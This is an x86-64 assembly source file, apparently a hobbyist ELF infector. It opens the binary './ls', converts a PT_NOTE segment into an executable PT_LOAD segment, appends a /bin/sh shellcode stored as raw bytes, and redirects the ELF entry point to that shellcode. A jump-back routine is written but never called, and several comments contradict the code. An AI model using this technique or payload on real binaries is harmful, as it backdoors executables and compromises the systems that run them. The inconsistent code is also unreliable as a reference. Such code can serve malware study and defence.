section .data
  pathname db "./ls", 0   ; filename (terminated with null character)

  error_msg db "Il y a un probleme", 0xA ; Message when e_entry matches
  error_msg_len equ $ - error_msg           ; Length of the match message

  note_msg db "PT_NOTE segment FOUND", 0xA ; Message to print
  note_len equ $ - note_msg         ; Message length

  payload_message db 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54, 0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05
  payload_msg_len equ $ - payload_message

%define SEEK_END 2        ; SEEK_END constant for lseek syscall
%define SYS_LSEEK 8       ; syscall number for lseek
%define SYS_PWRITE64 18   ; syscall number for pwrite64
%define SYS_SYNC 162      ; syscall number for sync

section .bss
ELF_Header: resb 64                    ; ELF header buffer
ph_entry: resb 64                      ; Program header entry buffer
e_entry_point: resb 8                  ; Entry point field
e_phoff: resb 8                        ; Program header offset field
e_phentsize: resb 2                    ; Program header entry size field
e_phnum: resb 2                        ; Number of program headers field
fd resq 1                              ; File descriptor
p_offset: resb 8
p_vaddr: resb 8 
p_filesz: resb 8
statbuf resb 144                  ; reserve space for the stat struct
fsize resq 1                      ; Reserve 8 bytes to store the file size (64-bit value)

section .text
global _start

_start:
  call read_file
  call check_ELF_file
  call save_Important_field_ELF_Header
  call find_PT_NOTE

  ; Finish the execution successfully
  mov rax, 60           ; syscall number for 'exit'
  xor rdi, rdi          ; exit code 0 (success)
  syscall

error:
  ; Handle errors (exit with code 1 if something goes wrong)
  ; Print error Message
  mov rax, 1              ; syscall: write
  mov rdi, 1              ; stdout
  lea rsi, [error_msg] ; Pointer to entry point
  mov rdx, error_msg_len              ; Write 8 bytes
  syscall

  mov rax, 60           ; syscall number for 'exit'
  mov rdi, 1            ; exit code 1 (indicating an error)
  syscall

; -----------------------------
; Function: read_file
; This function opens a file and reads its content into the buffer.
; It uses system calls 'read' and 'open for file operations and handles errors.
; -----------------------------
read_file:
  ; Open the file
  mov rax, 2           ; syscall number for 'open'
  mov rdi, pathname     ; pointer to the filename (first argument for 'open')
  mov rsi, 0x2          ; flags = 0 (O_RDONLY = 0) for read-only mode
  syscall

  ; Check if the file was opened successfully
  cmp rax, 0
  jl error              ; if rax < 0, an error occurred (jump to error)

  mov [fd], rax         ; Save file descriptor to `fd`

  ; Read the content of the file
  mov rdi, rax          ; move file descriptor returned by 'open' to rdi
  mov rax, 0            ; syscall number for 'read'
  mov rsi, ELF_Header       ; buffer to store the file content
  mov rdx, 64            ; number of bytes to read (4 bytes)
  syscall

  ; Check if the read was successful
  cmp rax, 0
  jl error              ; if rax < 0, an error occurred (jump to error)

  ret                   ; return to caller


; -----------------------------
; Function: check_ELF_file
; This function checks if the file starts with the ELF magic number (0x7f 45 4c 46).
; If the file is not an ELF file, it jumps to the error handler.
; -----------------------------
check_ELF_file:
  mov al, byte [ELF_Header]  ; load the first byte of the buffer into al
  cmp al, 0x7f           ; compare with 0x7f (ELF magic number prefix)
  jne error              ; if not equal, jump to error

  ; Check the second byte (should be 'E' = 0x45)
  mov al, byte [ELF_Header + 1]  ; load the second byte of the buffer
  cmp al, 0x45           ; compare with 'E' (0x45 in hex)
  jne error              ; if not equal, jump to error

  ; Check the third byte (should be 'L' = 0x4C)
  mov al, byte [ELF_Header + 2]  ; load the third byte of the buffer
  cmp al, 0x4C           ; compare with 'L' (0x4C in hex)
  jne error              ; if not equal, jump to error

  ; Check the fourth byte (should be 'F' = 0x46)
  mov al, byte [ELF_Header + 3]  ; load the fourth byte of the buffer
  cmp al, 0x46           ; compare with 'F' (0x46 in hex)
  jne error              ; if not equal, jump to error

  ret                    ; return to caller if ELF file is valid

; -----------------------------
; Function: save_entry_point
; This function save the virtual address entry_point from the elf header
; -----------------------------
save_Important_field_ELF_Header:
  ; Save e_entry (Entry Point)
  mov rax, qword [ELF_Header + 0x18] ; Extract the 64-bit entry point
  mov qword [e_entry_point], rax ; Save it to the `e_entry_point` variable

  ; Save e_phoff (Program Header Table Offset)
  mov rax, qword [ELF_Header + 0x20] ; Extract the 64-bit program header table offset
  mov qword [e_phoff], rax       ; Save it to the `e_phoff` variable

  ; Save e_phentsize (Program Header Entry Size)
  movzx rax, word [ELF_Header + 0x36] ; Extract the 16-bit entry size
  mov word [e_phentsize], ax       ; Save it to the `e_phentsize` variable

  ; Save e_phnum (Number of Program Header Entries)
  movzx rax, word [ELF_Header + 0x38] ; Extract the 16-bit number of entries
  mov word [e_phnum], ax          ; Save it to the `e_phnum` variable

  ret                             ; Return to the caller

; -----------------------------
; Function: find_PT_NOTE
; Loop through all program headers to find a PT_NOTE segment.
; -----------------------------
find_PT_NOTE:
    mov rbx, [e_phoff]                ; Start of program header table
    movzx rcx, word [e_phnum]         ; Number of program headers
    movzx rdx, word [e_phentsize]     ; Size of each program header
    xor rsi, rsi                      ; Modification flag (0 = no modification)

loop_ph:
    test rcx, rcx                     ; Check if we've processed all headers
    jz done_ph

    ; Check if a modification has been made
    cmp rsi, 1                        ; Check if modification flag is set 
    je done_ph                        ; Exit loop if modification done

    ; Save registers
    push rbx
    push rcx
    push rdx

    ; Read the current program header
    mov rdi, rbx                      ; Offset to the current program header
    lea rsi, [ph_entry]               ; Buffer to store the program header
    mov rdx, 64                       ; Read 64 bytes (PH size)
    call read_at_offset

    ; Check if segment is PT_NOTE
    mov eax, dword [ph_entry]         ; Load Type field
    cmp eax, 0x4                      ; Compare with PT_NOTE
    jne skip_ph

    ; Use `stat` to get file information
    lea rdi, [pathname]       ; Path to the ELF file
    lea rsi, [statbuf]        ; Buffer for stat structure
    mov rax, 4                ; syscall: stat
    syscall
    js error                  ; Jump to error handler if stat fails

    ; Extract file size from `statbuf`
    mov rax, qword [statbuf + 0x30] ; Offset of st_size in stat structure
    mov [fsize], rax               ; Store file size in `fsize`

    ; Modify PT_NOTE to PT_LOAD
    mov dword [ph_entry], 0x1         ; Change type to PT_LOAD

    ; Ensure permissions include `R` and `E`
    mov eax, dword [ph_entry + 0x4]   ; Load p_flags
    or eax, 0x7                       ; Add R and E permissions
    mov dword [ph_entry + 0x4], eax   ; Store updated p_flags

    add qword [ph_entry + 0x20], payload_msg_len  ; Update p_filesz
    add qword [ph_entry + 0x28], payload_msg_len  ; Update p_memsz
    mov rax, [fsize]
    mov qword [ph_entry + 0x08], rax          ; Update p_offset to file end
    mov rax, 0xc000000                ; Base virtual address
    add rax, [fsize]                  ; Add file size
    mov qword [ph_entry + 0x10], rax  ; Update p_vaddr

    ; Write modified program header back
    mov rdi, rbx                      ; Offset to the current program header
    lea rsi, [ph_entry]               ; Modified program header
    mov rdx, 64                       ; Program header size
    call write_at_offset

    ; Write the payload
    mov rdi, [fsize]                  ; Offset to the end of the file
    lea rsi, [rel payload]            ; Payload location
    mov rdx, payload_msg_len          ; Payload size
    call write_at_offset

    ; Update entry point
    mov rdi, ELF_Header               ; ELF header buffer
    mov rax, [ph_entry + 0x10]
    mov qword [rdi + 0x18], rax       ; Set e_entry to new virtual address

    ; Write updated ELF header
    mov rdi, 0x0                      ; Offset to ELF header
    lea rsi, [ELF_Header]             ; ELF header buffer
    mov rdx, 64                       ; ELF header size
    call write_at_offset
    mov rsi, 1

skip_ph:
    ; Restore registers
    pop rdx
    pop rcx
    pop rbx

    ; Move to next program header
    add rbx, rdx
    dec rcx
    jmp loop_ph

done_ph:
    ret

payload:
    ; Shellcode to execute /bin/sh
    db 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54, 0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05

    ; Calculate the relative jump to the original entry point
write_patched_jmp:
    ; Get the current EOF (end of file)
    mov rdi, [fd]                 ; File descriptor
    mov rsi, 0                    ; Offset
    mov rdx, SEEK_END             ; SEEK_END = 2
    mov rax, SYS_LSEEK            ; lseek syscall
    syscall                       ; rax = EOF offset

    ; Calculate the relative jump offset
    mov r8, [e_entry_point]       ; r8 = original entry point (0x5130)
    mov r9, [ph_entry + 0x10]     ; r9 = payload vaddr
    add r9, 5                     ; Add 5 for the jmp instruction size
    sub r8, r9                    ; Calculate the relative offset
    sub r8, payload_msg_len       ; Account for the payload size

    ; Write the `jmp` instruction to the end of the payload
    mov byte [ph_entry], 0xe9     ; e9 = opcode for relative jump
    mov dword [ph_entry + 1], r8d ; Write the 32-bit relative offset

    ; Append the jmp instruction to the file
    mov rdi, [fd]                 ; File descriptor
    lea rsi, [ph_entry]           ; Buffer containing the jmp instruction
    mov rdx, 5                    ; Size of the jmp instruction
    mov r10, rax                  ; r10 = EOF offset
    mov rax, SYS_PWRITE64         ; pwrite syscall
    syscall

    ; Ensure filesystem caches are written
    mov rax, SYS_SYNC
    syscall

; -----------------------------
; Function: write_at_offset
; Write data to a specific offset in the file.
; Arguments:
;   rdi = offset (start of program header)
;   rsi = buffer (e.g., ph_entry)
;   rdx = size (e.g., size of the program header)
; -----------------------------
write_at_offset:
  push r10                          ; Save r10 and r11 (callee-saved registers)
  push r11

  ; Perform lseek to move to the given offset
  mov rax, 8                        ; syscall: lseek
  mov r10, [fd]                     ; File descriptor
  mov r11, rdi                      ; Offset (rdi passed to function)
  mov rdi, r10                      ; File descriptor
  mov r10, rsi
  mov rsi, r11                      ; Offset
  xor rdx, rdx                      ; SEEK_SET
  syscall
  test rax, rax                     ; Check for errors
  js error                          ; Jump to error if lseek failed


  ; Perform the write at the current offset
  mov rax, 1                        ; syscall: write
  mov rdi, [fd]                      ; File descriptor
  mov rsi, r10
  mov rdx, 64 
  syscall                           ; Buffer is already in rsi, size in rdx
  test rax, rax                     ; Check for errors
  js error

  mov rax, 74         ; syscall: fsync
  mov rdi, [fd]       ; File descriptor
  syscall


  pop r11                           ; Restore r10 and r11
  pop r10
  ret

; -----------------------------
; Function: read_at_offset
; Read data from a specific offset in the file.
; Arguments:
;   rdi = offset (start of program header)
;   rsi = buffer (e.g., ph_entry)
;   rdx = size (e.g., size of the program header)
; -----------------------------
read_at_offset:
  push r10                          ; Save r10 and r11 (callee-saved registers)
  push r11
  push rdx                          ; Save rdx
  push rcx                          ; Save rcx

  ; Perform lseek to move to the given offset
  mov rax, 8                        ; syscall: lseek
  mov r10, [fd]                     ; File descriptor
  mov r11, rdi                      ; Offset (rdi passed to function)
  mov rdi, r10                      ; File descriptor
  mov rsi, r11                      ; Offset
  xor rdx, rdx                      ; SEEK_SET
  syscall
  test rax, rax                     ; Check for errors
  js error                          ; Jump to error if lseek failed

  ; Perform the read at the current offset
  mov rax, 0                        ; syscall: read
  mov rdi, r10                      ; File descriptor
  mov rsi, ph_entry 
  mov rdx, 64
  syscall                           ; Buffer is already in rsi, size in rdx
  test rax, rax                     ; Check for errors
  js error

  pop rcx                           ; Restore rcx
  pop rdx                           ; Restore rdx
  pop r11                           ; Restore r10 and r11
  pop r10
  ret
